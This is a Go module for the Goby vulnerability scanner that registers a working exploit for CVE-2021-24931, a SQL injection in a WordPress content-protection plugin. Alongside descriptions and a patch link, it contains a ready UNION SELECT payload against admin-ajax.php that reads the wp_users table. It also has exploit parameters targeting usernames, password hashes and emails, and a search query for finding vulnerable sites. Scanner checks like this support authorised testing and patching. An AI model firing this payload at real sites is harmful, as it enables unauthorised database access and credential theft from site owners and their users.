package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin SecureCopyContentProtection SQL Vulnerability (CVE-2021-24931)",
    "Description": "<p>Secure copy content protection is a WordPress plug-in designed to protect web content from plagiarism. Once the copy protection plug-in is activated, it will disable right-click, copy and paste, content selection and copy shortcuts on your website, so as to prevent content theft and network capture, which is very popular today. In addition to all the above replication methods, replication protection also allows you to disable the check element and provide a protected site where copyright infringement will not occur.</p>",
    "Impact": "<p>WordPress Plugin SecureCopyContentProtection SQLi CVE-2021-24931</p>",
    "Recommendation": "<p>Upgrade, patch link</p><p><a href=\"https://downloads.wordpress.org/plugin/secure-copy-content-protection.3.0.4.zip\">https://downloads.wordpress.org/plugin/secure-copy-content-protection.3.0.4.zip</a></p>",
    "Product": "wordpress",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "WordPress SecureCopyContentProtection 内容保护插件 sccp_id 参数 SQL 注入漏洞（CVE-2021-24931）",
            "Product": "wordpress",
            "Description": "<p>Secure Copy Content Protection是一个WordPress插件，旨在保护Web内容不被抄袭。一旦激活了复制保护插件，它就会禁用您网站上的右键单击，复制粘贴，内容选择和复制快捷键，从而防止内容盗窃以及网络抓取，这在当今非常流行。除了上述所有复制方法外，复制保护还允许禁用检查元素，并提供一个受保护的站点，其中不会发生侵犯版权的行为。</p>",
            "Recommendation": "<p>升级版，补丁链接</p><p><a href=\"https://downloads.wordpress.org/plugin/secure-copy-content-protection.3.0.4.zip\">https://downloads.wordpress.org/plugin/secure-copy-content-protection.3.0.4.zip</a></p>",
            "Impact": "<p>1、攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</p><p>2、可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</p><p>3、如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</p><p>4、经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin SecureCopyContentProtection SQL Vulnerability (CVE-2021-24931)",
            "Product": "wordpress",
            "Description": "<p>Secure copy content protection is a WordPress plug-in designed to protect web content from plagiarism. Once the copy protection plug-in is activated, it will disable right-click, copy and paste, content selection and copy shortcuts on your website, so as to prevent content theft and network capture, which is very popular today. In addition to all the above replication methods, replication protection also allows you to disable the check element and provide a protected site where copyright infringement will not occur.<br></p>",
            "Recommendation": "<p>Upgrade, patch link<br></p><p><a href=\"https://downloads.wordpress.org/plugin/secure-copy-content-protection.3.0.4.zip\">https://downloads.wordpress.org/plugin/secure-copy-content-protection.3.0.4.zip</a><br></p>",
            "Impact": "<p>WordPress Plugin SecureCopyContentProtection SQLi CVE-2021-24931</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"/wp-content/plugins/secure-copy-content-protection\"",
    "GobyQuery": "body=\"/wp-content/plugins/secure-copy-content-protection\"",
    "Author": "大C",
    "Homepage": "https://wordpress.org/plugins/secure-copy-content-protection/",
    "DisclosureDate": "2022-04-02",
    "References": [
        "https://fofa.info/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-24931"
    ],
    "CNVD": [
        "CNVD-2021-99872"
    ],
    "CNNVD": [
        "CNNVD-202112-366"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20union%20select%201,md5(1423),2,2,2,2%20from%20wp_users%20union%20select%201,1,1,1,1,1%20FROM%20wp_ays_sccp_reports%20WHERE%20(1=1%20&type=json",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "856fc81623da2150ba2210ba1b51d241",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20union%20select%201,md5(1423),2,2,2,2%20from%20wp_users%20union%20select%201,1,1,1,1,1%20FROM%20wp_ays_sccp_reports%20WHERE%20(1=1%20&type=json",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "856fc81623da2150ba2210ba1b51d241",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sql",
            "type": "select",
            "value": "user_name,user_pass,user_email",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10364"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
